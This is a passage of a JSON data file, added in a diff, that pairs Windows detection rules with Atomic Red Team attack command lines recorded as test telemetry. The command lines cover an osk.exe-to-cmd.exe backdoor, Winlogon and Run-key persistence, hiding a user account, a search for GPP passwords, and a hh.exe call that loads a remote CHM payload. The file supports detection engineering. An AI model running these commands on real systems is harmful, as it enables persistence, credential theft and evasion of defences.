@@ -1,0 +1,759 @@
+{
+  "metadata": {
+    "target_rules_file": "process_creation_rule_names_without_phase1_1_6.txt",
+    "atomic_source_file": "data_atomic_redteam.xlsx",
+    "json_source_file": "rule_commandlines.json",
+    "uuid_to_rule_mapping_source": "Ket_qua_phase1_1_6.xlsx",
+    "target_rule_count": 509,
+    "atomic_rows_total": 1725,
+    "atomic_rules_with_data_in_target": 136,
+    "json_rules_with_data_in_target": 37,
+    "rules_with_any_data": 156,
+    "rules_with_both_sources": 17,
+    "rules_atomic_only": 119,
+    "rules_json_only": 20,
+    "generated_at_utc": "2026-06-01T17:06:48.159354+00:00",
+    "notes": [
+      "This file contains only rules that have data in both data_atomic_redteam.xlsx and rule_commandlines.json."
+    ],
+    "rules_with_both_sources_only": 17
+  },
+  "rules": {
+    "proc_creation_win_certutil_certificate_installation": {
+      "rule_name": "proc_creation_win_certutil_certificate_installation",
+      "rule_title": "New Root Certificate Installed Via Certutil.EXE",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1553.004",
+          "commandline": "\"C:\\WINDOWS\\system32\\certutil.exe\" -addstore my C:\\Users\\thaim\\AppData\\Local\\Temp\\rootCA2.cer",
+          "rule_title": "New Root Certificate Installed Via Certutil.EXE",
+          "rule_uuid": "d2125259-ddea-4c1c-9c22-977eb5b29cf0",
+          "rule_level": "medium",
+          "tags": "attack.defense-evasion; attack.t1553.004",
+          "match_count": "1.0",
+          "original_logfile": "T1553.004_5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f_Install_root_CA_on_Windows_with_certutil.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "certutil  -addstore -f root C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\cert.cer"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_chcp_codepage_lookup": {
+      "rule_name": "proc_creation_win_chcp_codepage_lookup",
+      "rule_title": "Console CodePage Lookup Via CHCP",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1614.001",
+          "commandline": "chcp",
+          "rule_title": "Console CodePage Lookup Via CHCP",
+          "rule_uuid": "7090adee-82e2-4269-bd59-80691e7c6338",
+          "rule_level": "medium",
+          "tags": "attack.discovery; attack.t1614.001",
+          "match_count": "1.0",
+          "original_logfile": "T1614.001_d91473ca-944e-477a-b484-0e80217cd789_Discover_System_Language_with_chcp.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "chcp"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_cmd_assoc_execution": {
+      "rule_name": "proc_creation_win_cmd_assoc_execution",
+      "rule_title": "Change Default File Association Via Assoc",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1546.001",
+          "commandline": "\"cmd.exe\" /c assoc .hta=txtfile",
+          "rule_title": "Change Default File Association Via Assoc",
+          "rule_uuid": "3d3aa6cd-6272-44d6-8afc-7e88dfef7061",
+          "rule_level": "low",
+          "tags": "attack.persistence; attack.t1546.001",
+          "match_count": "1.0",
+          "original_logfile": "T1546.001_10a08978-2045-4d62-8c42-1957bbbea102_Change_Default_File_Association.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "cmd  /c assoc"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_cmd_mklink_osk_cmd": {
+      "rule_name": "proc_creation_win_cmd_mklink_osk_cmd",
+      "rule_title": "Potential Privilege Escalation Using Symlink Between Osk and Cmd",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1546.008",
+          "commandline": "\"cmd.exe\" /c IF NOT EXIST %%windir%%\\System32\\osk.exe.bak (copy %%windir%%\\System32\\osk.exe %%windir%%\\System32\\osk.exe.bak) ELSE ( pushd ) & takeown /F %%windir%%\\System32\\osk.exe /A & icacls %%windir%%\\System32\\osk.exe /grant Administrators:F /t & del %%windir%%\\System32\\osk.exe & mklink %%windir%%\\System32\\osk.exe %%windir%%\\System32\\cmd.exe",
+          "rule_title": "Potential Privilege Escalation Using Symlink Between Osk and Cmd",
+          "rule_uuid": "e9b61244-893f-427c-b287-3e708f321c6b",
+          "rule_level": "high",
+          "tags": "attack.privilege-escalation; attack.persistence; attack.t1546.008",
+          "match_count": "1.0",
+          "original_logfile": "T1546.008_51ef369c-5e87-4f33-88cd-6d61be63edf2_Create_Symbolic_Link_From_osk.exe_to_cmd.exe.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "cmd  /c \"mklink C:\\Windows\\System32\\osk.exe C:\\Windows\\System32\\cmd.exe\""
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_discovery_via_reg_queries": {
+      "rule_name": "proc_creation_win_discovery_via_reg_queries",
+      "rule_title": "System Information Discovery via Registry Queries",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1082",
+          "commandline": "reg  query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber",
+          "rule_title": "System Information Discovery via Registry Queries",
+          "rule_uuid": "0022869c-49f7-4ff2-ba03-85ac42ddac58",
+          "rule_level": "low",
+          "tags": "attack.discovery; attack.t1082",
+          "match_count": "1.0",
+          "original_logfile": "T1082_acfcd709-0013-4f1e-b9ee-bc1e7bafaaec_Discover_OS_Build_Number_via_Registry.evtx"
+        },
+        {
+          "technical": "T1082",
+          "commandline": "reg  query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v ProductName",
+          "rule_title": "System Information Discovery via Registry Queries",
+          "rule_uuid": "0022869c-49f7-4ff2-ba03-85ac42ddac58",
+          "rule_level": "low",
+          "tags": "attack.discovery; attack.t1082",
+          "match_count": "1.0",
+          "original_logfile": "T1082_be3b5fe3-a575-4fb8-83f6-ad4a68dd5ce7_Discover_OS_Product_Name_via_Registry.evtx"
+        },
+        {
+          "technical": "T1124",
+          "commandline": "reg  query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\" /v TimeZoneKeyName",
+          "rule_title": "System Information Discovery via Registry Queries",
+          "rule_uuid": "0022869c-49f7-4ff2-ba03-85ac42ddac58",
+          "rule_level": "low",
+          "tags": "attack.discovery; attack.t1082",
+          "match_count": "1.0",
+          "original_logfile": "T1124_25c5d1f1-a24b-494a-a6c5-5f50a1ae7f47_Discover_System_Time_Zone_via_Registry.evtx"
+        },
+        {
+          "technical": "T1547.001",
+          "commandline": "\"powershell.exe\" & {$oldvalue = $(Get-ItemPropertyValue -Path  \\\"\"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"\" -Name \\\"\"Shell\\\"\");\nSet-ItemProperty -Path \\\"\"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"\" -Name \\\"\"Shell-backup\\\"\" -Value \\\"\"$oldvalue\\\"\";\n$newvalue = $oldvalue + \\\"\", C:\\Windows\\explorer.exe\\\"\";\nSet-ItemProperty -Path  \\\"\"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"\" -Name \\\"\"Shell\\\"\" -Value \\\"\"$newvalue\\\"\"}",
+          "rule_title": "System Information Discovery via Registry Queries",
+          "rule_uuid": "0022869c-49f7-4ff2-ba03-85ac42ddac58",
+          "rule_level": "low",
+          "tags": "attack.discovery; attack.t1082",
+          "match_count": "1.0",
+          "original_logfile": "T1547.001_1d958c61-09c6-4d9e-b26b-4130314e520e_HKLM_-_Modify_default_System_Shell_-_Winlogon_Shell_KEY_Value_.evtx"
+        },
+        {
+          "technical": "T1547.001",
+          "commandline": "\"powershell.exe\" & {$oldvalue = $(Get-ItemPropertyValue -Path  \\\"\"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"\" -Name \\\"\"Userinit\\\"\");\nSet-ItemProperty -Path \\\"\"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"\" -Name \\\"\"Userinit-backup\\\"\" -Value \\\"\"$oldvalue\\\"\";\n$newvalue = $oldvalue + \\\"\" C:\\Windows\\System32\\calc.exe\\\"\";\nSet-ItemProperty -Path  \\\"\"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"\" -Name \\\"\"Userinit\\\"\" -Value \\\"\"$newvalue\\\"\"}",
+          "rule_title": "System Information Discovery via Registry Queries",
+          "rule_uuid": "0022869c-49f7-4ff2-ba03-85ac42ddac58",
+          "rule_level": "low",
+          "tags": "attack.discovery; attack.t1082",
+          "match_count": "1.0",
+          "original_logfile": "T1547.001_f7fab6cc-8ece-4ca7-a0f1-30a22fccd374_HKLM_-_Append_Command_to_Winlogon_Userinit_KEY_Value.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "reg  query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\" /v CurrentBuildNumber"
+      ],
+      "counts": {
+        "atomic_rows": 5,
+        "json_commandlines": 1,
+        "total_commandlines": 6
+      }
+    },
+    "proc_creation_win_findstr_gpp_passwords": {
+      "rule_name": "proc_creation_win_findstr_gpp_passwords",
+      "rule_title": "Findstr GPP Passwords",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1552.006",
+          "commandline": "findstr  /S cpassword \\\\THAIMX\\sysvol\\*.xml",
+          "rule_title": "Findstr GPP Passwords",
+          "rule_uuid": "91a2c315-9ee6-4052-a853-6f6a8238f90d",
+          "rule_level": "high",
+          "tags": "attack.credential-access; attack.t1552.006",
+          "match_count": "1.0",
+          "original_logfile": "T1552.006_870fe8fb-5e23-4f5f-b89d-dd7fe26f3b5f_GPP_Passwords_(findstr).evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "findstr  /S cpassword \\\\AR-WIN-DC\\sysvol\\*.xml"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_findstr_lsass": {
+      "rule_name": "proc_creation_win_findstr_lsass",
+      "rule_title": "LSASS Process Reconnaissance Via Findstr.EXE",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1057",
+          "commandline": "\"cmd.exe\" /c tasklist | findstr lsass",
+          "rule_title": "LSASS Process Reconnaissance Via Findstr.EXE",
+          "rule_uuid": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
+          "rule_level": "high",
+          "tags": "attack.credential-access; attack.t1552.006",
+          "match_count": "1.0",
+          "original_logfile": "T1057_11ba69ee-902e-4a0f-b3b6-418aed7d7ddb_Discover_Specific_Process_-_tasklist.evtx"
+        },
+        {
+          "technical": "T1057",
+          "commandline": "findstr  lsass",
+          "rule_title": "LSASS Process Reconnaissance Via Findstr.EXE",
+          "rule_uuid": "fe63010f-8823-4864-a96b-a7b4a0f7b929",
+          "rule_level": "high",
+          "tags": "attack.credential-access; attack.t1552.006",
+          "match_count": "1.0",
+          "original_logfile": "T1057_11ba69ee-902e-4a0f-b3b6-418aed7d7ddb_Discover_Specific_Process_-_tasklist.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "findstr  lsass"
+      ],
+      "counts": {
+        "atomic_rows": 2,
+        "json_commandlines": 1,
+        "total_commandlines": 3
+      }
+    },
+    "proc_creation_win_findstr_recon_pipe_output": {
+      "rule_name": "proc_creation_win_findstr_recon_pipe_output",
+      "rule_title": "Recon Command Output Piped To Findstr.EXE",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1018",
+          "commandline": "\"powershell.exe\" & {$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\\\"\".\\\"\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | %% { \\\"\"$firstOctet.$secondOctet.$thirdOctet.$_\\\"\" } ) {cmd.exe /c nslookup $ip}}",
+          "rule_title": "Recon Command Output Piped To Findstr.EXE",
+          "rule_uuid": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
+          "rule_level": "medium",
+          "tags": "attack.discovery; attack.t1057",
+          "match_count": "1.0",
+          "original_logfile": "T1018_baa01aaa-5e13-45ec-8a0d-e46c93c9760f_Remote_System_Discovery_-_nslookup.evtx"
+        },
+        {
+          "technical": "T1033",
+          "commandline": "\"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %%i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %%i | find /v \"#\" | find /v \"console\" || echo %%j > computers.txt & @FOR /F %%n in (computers.txt) DO @FOR /F \"tokens=1,2\" %%i in ('qwinsta /server:%%n ^| findstr \"Active Disc\"') do @echo %%i | find /v \"#\" | find /v \"console\" || echo %%j > usernames.txt",
+          "rule_title": "Recon Command Output Piped To Findstr.EXE",
+          "rule_uuid": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
+          "rule_level": "medium",
+          "tags": "attack.discovery; attack.t1057",
+          "match_count": "1.0",
+          "original_logfile": "T1033_4c4959bf-addf-4b4a-be86-8d09cc1857aa_System_Owner_User_Discovery.evtx"
+        },
+        {
+          "technical": "T1057",
+          "commandline": "\"cmd.exe\" /c tasklist | findstr lsass",
+          "rule_title": "Recon Command Output Piped To Findstr.EXE",
+          "rule_uuid": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
+          "rule_level": "medium",
+          "tags": "attack.discovery; attack.t1057",
+          "match_count": "1.0",
+          "original_logfile": "T1057_11ba69ee-902e-4a0f-b3b6-418aed7d7ddb_Discover_Specific_Process_-_tasklist.evtx"
+        },
+        {
+          "technical": "T1518.001",
+          "commandline": "\"cmd.exe\" /c netsh.exe advfirewall  show allprofiles  & netsh.exe advfirewall firewall dump & netsh.exe advfirewall show currentprofile & netsh.exe advfirewall firewall show rule name=all & netsh.exe firewall show state & netsh.exe firewall show config & sc query windefend & powershell.exe /c \"Get-Process | Where-Object { $_.ProcessName -eq 'Sysmon' }\" & powershell.exe /c \"Get-Service | where-object {$_.DisplayName -like '*sysm*'}\" & powershell.exe /c \"Get-CimInstance Win32_Service -Filter 'Description = ''System Monitor service'''\" & tasklist.exe & tasklist.exe | findstr /i virus & tasklist.exe | findstr /i cb & tasklist.exe | findstr /i defender & tasklist.exe | findstr /i cylance & tasklist.exe | findstr /i mc & tasklist.exe | findstr /i \"virus cb defender cylance mc\"",
+          "rule_title": "Recon Command Output Piped To Findstr.EXE",
+          "rule_uuid": "ccb5742c-c248-4982-8c5c-5571b9275ad3",
+          "rule_level": "medium",
+          "tags": "attack.discovery; attack.t1057",
+          "match_count": "1.0",
+          "original_logfile": "T1518.001_f92a380f-ced9-491f-b338-95a991418ce2_Security_Software_Discovery.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "cmd  /c \"tasklist | findstr powershell\""
+      ],
+      "counts": {
+        "atomic_rows": 4,
+        "json_commandlines": 1,
+        "total_commandlines": 5
+      }
+    },
+    "proc_creation_win_gpresult_execution": {
+      "rule_name": "proc_creation_win_gpresult_execution",
+      "rule_title": "Gpresult Display Group Policy Information",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1615",
+          "commandline": "gpresult  /z",
+          "rule_title": "Gpresult Display Group Policy Information",
+          "rule_uuid": "e56d3073-83ff-4021-90fe-c658e0709e72",
+          "rule_level": "medium",
+          "tags": "attack.discovery; attack.t1615",
+          "match_count": "1.0",
+          "original_logfile": "T1615_0976990f-53b1-4d3f-a185-6df5be429d3b_Display_group_policy_information_via_gpresult.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "gpresult  /z"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_hh_chm_execution": {
+      "rule_name": "proc_creation_win_hh_chm_execution",
+      "rule_title": "HH.EXE Execution",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1218.001",
+          "commandline": "hh.exe  -decompile C:\\Users\\thaim\\AppData\\Local\\Temp \"C:\\AtomicRedTeam\\atomics\\T1218.001\\src\\T1218.001.chm\"",
+          "rule_title": "HH.EXE Execution",
+          "rule_uuid": "68c8acb4-1b60-4890-8e82-3ddf7a6dba84",
+          "rule_level": "low",
+          "tags": "attack.defense-evasion; attack.t1218.001",
+          "match_count": "1.0",
+          "original_logfile": "T1218.001_20cb05e0-1fa5-406d-92c1-84da4ba01813_Decompile_Local_CHM_File.evtx"
+        },
+        {
+          "technical": "T1218.001",
+          "commandline": "hh.exe  \"C:\\AtomicRedTeam\\atomics\\T1218.001\\src\\T1218.001.chm\"",
+          "rule_title": "HH.EXE Execution",
+          "rule_uuid": "68c8acb4-1b60-4890-8e82-3ddf7a6dba84",
+          "rule_level": "low",
+          "tags": "attack.defense-evasion; attack.t1218.001",
+          "match_count": "1.0",
+          "original_logfile": "T1218.001_5cb87818-0d7c-4469-b7ef-9224107aebe8_Compiled_HTML_Help_Local_Payload.evtx"
+        },
+        {
+          "technical": "T1218.001",
+          "commandline": "hh.exe  https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm",
+          "rule_title": "HH.EXE Execution",
+          "rule_uuid": "68c8acb4-1b60-4890-8e82-3ddf7a6dba84",
+          "rule_level": "low",
+          "tags": "attack.defense-evasion; attack.t1218.001",
+          "match_count": "1.0",
+          "original_logfile": "T1218.001_0f8af516-9818-4172-922b-42986ef1e81d_Compiled_HTML_Help_Remote_Payload.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "\"C:\\Windows\\hh.exe\" C:\\Windows\\IME\\IMETC\\HELP\\IMTCTC14.CHM"
+      ],
+      "counts": {
+        "atomic_rows": 3,
+        "json_commandlines": 1,
+        "total_commandlines": 4
+      }
+    },
+    "proc_creation_win_pua_adfind_enumeration": {
+      "rule_name": "proc_creation_win_pua_adfind_enumeration",
+      "rule_title": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1087.002",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\"  -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties",
+          "rule_title": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+          "rule_uuid": "455b9d50-15a1-4b99-853f-8d37655a4c1b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1087.002",
+          "match_count": "1.0",
+          "original_logfile": "T1087.002_736b4f53-f400-4c22-855d-1a6b5a551600_Adfind_-Listing_password_policy.evtx"
+        },
+        {
+          "technical": "T1087.002",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp",
+          "rule_title": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+          "rule_uuid": "455b9d50-15a1-4b99-853f-8d37655a4c1b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1087.002",
+          "match_count": "1.0",
+          "original_logfile": "T1087.002_b95fd967-4e62-4109-b48d-265edfd28c3a_Adfind_-_Enumerate_Active_Directory_Admins.evtx"
+        },
+        {
+          "technical": "T1087.002",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses",
+          "rule_title": "PUA - Suspicious ActiveDirectory Enumeration Via AdFind.EXE",
+          "rule_uuid": "455b9d50-15a1-4b99-853f-8d37655a4c1b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1087.002",
+          "match_count": "1.0",
+          "original_logfile": "T1087.002_5e2938fb-f919-47b6-8b29-2f6a1f718e99_Adfind_-_Enumerate_Active_Directory_Exchange_AD_Objects.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "AdFind.exe   -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties"
+      ],
+      "counts": {
+        "atomic_rows": 3,
+        "json_commandlines": 1,
+        "total_commandlines": 4
+      }
+    },
+    "proc_creation_win_reg_add_run_key": {
+      "rule_name": "proc_creation_win_reg_add_run_key",
+      "rule_title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1112",
+          "commandline": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v NetWire /t REG_SZ  /d \"C:\\Users\\admin\\AppData\\Roaming\\Install\\Host.exe\" /f",
+          "rule_title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_uuid": "de587dce-915e-4218-aac4-835ca6af6f70",
+          "rule_level": "medium",
+          "tags": "attack.persistence; attack.t1547.001",
+          "match_count": "1.0",
+          "original_logfile": "T1112_65704cd4-6e36-4b90-b6c1-dc29a82c8e56_NetWire_RAT_Registry_Key_Creation.evtx"
+        },
+        {
+          "technical": "T1112",
+          "commandline": "reg  add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f",
+          "rule_title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_uuid": "de587dce-915e-4218-aac4-835ca6af6f70",
+          "rule_level": "medium",
+          "tags": "attack.persistence; attack.t1547.001",
+          "match_count": "1.0",
+          "original_logfile": "T1112_282f929a-6bc5-42b8-bd93-960c3ba35afe_Modify_Registry_of_Local_Machine_-_cmd.evtx"
+        },
+        {
+          "technical": "T1547.001",
+          "commandline": "REG  ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"Atomic Red Team\" /t REG_SZ /F /D \"C:\\Path\\AtomicRedTeam.exe\"",
+          "rule_title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_uuid": "de587dce-915e-4218-aac4-835ca6af6f70",
+          "rule_level": "medium",
+          "tags": "attack.persistence; attack.t1547.001",
+          "match_count": "1.0",
+          "original_logfile": "T1547.001_e55be3fd-3521-4610-9d1a-e210e42dcf05_Reg_Key_Run.evtx"
+        },
+        {
+          "technical": "T1547.001",
+          "commandline": "REG  ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\Path\\AtomicRedTeam.dll\"",
+          "rule_title": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_uuid": "de587dce-915e-4218-aac4-835ca6af6f70",
+          "rule_level": "medium",
+          "tags": "attack.persistence; attack.t1547.001",
+          "match_count": "1.0",
+          "original_logfile": "T1547.001_554cbd88-cde1-4b56-8168-0be552eed9eb_Reg_Key_RunOnce.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "REG   ADD \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"softoz\" /t REG_SZ /F /D \"C:\\Users\\admin\\AppData\\Roaming\\sihostt.exe\""
+      ],
+      "counts": {
+        "atomic_rows": 4,
+        "json_commandlines": 1,
+        "total_commandlines": 5
+      }
+    },
+    "proc_creation_win_registry_special_accounts_hide_user": {
+      "rule_name": "proc_creation_win_registry_special_accounts_hide_user",
+      "rule_title": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1564.002",
+          "commandline": "REG  ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0",
+          "rule_title": "Hiding User Account Via SpecialAccounts Registry Key - CommandLine",
+          "rule_uuid": "9ec9fb1b-e059-4489-9642-f270c207923d",
+          "rule_level": "medium",
+          "tags": "attack.defense-evasion; attack.t1564.002",
+          "match_count": "1.0",
+          "original_logfile": "T1564.002_173126b7-afe4-45eb-8680-fa9f6400431c_Create_Hidden_User_in_Registry.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "REG  ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_renamed_adfind": {
+      "rule_name": "proc_creation_win_renamed_adfind",
+      "rule_title": "Renamed AdFind Execution",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1016",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=subnet)",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1016_9bb45dd7-c466-4f93-83a1-be30e56033ee_Adfind_-_Enumerate_Active_Directory_Subnet_Objects.evtx"
+        },
+        {
+          "technical": "T1018",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer)",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1018_a889f5be-2d54-4050-bd05-884578748bb4_Adfind_-_Enumerate_Active_Directory_Computer_Objects.evtx"
+        },
+        {
+          "technical": "T1018",
+          "commandline": "\"powershell.exe\" & {([adsisearcher]\\\"\"objectcategory=computer\\\"\").FindAll(); ([adsisearcher]\\\"\"objectcategory=computer\\\"\").FindOne()}",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1018_64ede6ac-b57a-41c2-a7d1-32c6cd35397d_Enumerate_Active_Directory_Computers_with_ADSISearcher.evtx"
+        },
+        {
+          "technical": "T1018",
+          "commandline": "\"powershell.exe\" & {$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\\\"\"(ObjectCategory=Computer)\\\"\")\n$DirectorySearcher.PropertiesToLoad.Add(\\\"\"Name\\\"\")\n$Computers = $DirectorySearcher.findall()\nforeach ($Computer in $Computers) {\n  $Computer = $Computer.Properties.name\n  if (!$Computer) { Continue }\n  Write-Host $Computer}}",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1018_962a6017-1c09-45a6-880b-adc9c57cb22e_Enumerate_domain_computers_within_Active_Directory_using_DirectorySearcher.evtx"
+        },
+        {
+          "technical": "T1069.002",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group)",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1069.002_48ddc687-82af-40b7-8472-ff1e742e8274_Adfind_-_Query_Active_Directory_Groups.evtx"
+        },
+        {
+          "technical": "T1069.002",
+          "commandline": "\"powershell.exe\" & {([adsisearcher]\\\"\"objectcategory=group\\\"\").FindAll(); ([adsisearcher]\\\"\"objectcategory=group\\\"\").FindOne()}",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
